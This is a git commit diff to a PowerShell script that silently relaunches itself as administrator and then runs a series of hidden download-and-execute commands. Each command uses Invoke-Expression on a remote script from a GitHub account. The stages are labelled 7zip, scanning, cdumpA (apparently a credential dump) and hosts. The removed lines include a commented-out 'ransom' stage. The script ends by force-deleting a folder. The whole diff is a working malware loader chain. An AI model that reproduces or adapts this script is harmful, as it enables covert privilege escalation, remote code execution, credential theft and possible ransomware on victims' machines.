9a16c8f8e0b3f6310d51e1ca50001062ada7b59b
tameval <114147355+tameval@users.noreply.github.com>
2022-10-30 16:56:06 +0900

    Update init_124509.ps1

--- 33667/init_124509.ps1
+++ 33667/init_124509.ps1
@@ -14,18 +14,15 @@ if ((Get-Item -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\In
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrators")) { Start-Process powershell -WindowStyle Hidden "-File `"$PSCommandPath`"" -Verb RunAs; exit }
 
 #7zip
-powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/unzip_124509.ps1')"
+powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/7zip_33667.ps1')"
 
 #scanning
-powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/scan_124509.ps1')"
+powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/scan_33667.ps1')"
 
 #cdumpA
-powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/cdumpa_124509.ps1')"
+powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/cdumpa_33667.ps1')"
 
 #hosts
-powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/hosts_124509.ps1')"
-
-#ransom
-#powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object #Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/ransom_124509.ps1')"
+powershell -WindowStyle Hidden -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tameval/script/main/124509/hosts_33667.ps1')"
 
 Remove-Item C:\CRDemo -Recurse -Force
